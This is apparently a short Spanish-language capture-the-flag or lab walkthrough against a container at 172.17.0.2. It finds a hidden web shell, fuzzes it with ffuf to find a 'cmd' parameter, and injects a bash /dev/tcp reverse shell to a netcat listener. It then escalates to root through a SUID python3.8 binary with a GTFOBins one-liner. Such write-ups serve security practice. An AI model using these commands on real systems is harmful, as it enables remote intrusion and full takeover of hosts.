## Reconocimiento

Puerto 22 : SSH

Puerto 80 : HTTP

En la web no hay nada útil, pero inspeccionando el código encuentro:

```html
<p class="hidden-link"><a href="hidden/.shell.php">Access Panel</a></p>
```

No tiene nada, así que le hago fuzzing para encontrar a ver si existe un parámetro vulnerable:

```bash
ffuf -u http://172.17.0.2/hidden/.shell.php\?FUZZ\=whoami -w /usr/share/wordlists/dirb/big.txt -fs 0
```

Encuentro el parametro venerable “cmd”.

Toca concatenar una rev shell desde la URL.

Me pongo en escucha:

```bash
nc -lnvp 4444
```

Y ejecuto:

```bash
URL = http://172.17.0.2/hidden/.shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261'
```

Recibo una conexión.

## Escalada

Listo binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

Encuentro:

```bash
2126698   5360 -rwsr-xr-x   1 root  root  5486392 Jan 17 15:40 /usr/bin/python3.8
```

Gracias GTFO Bins:

```bash
python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Listo.
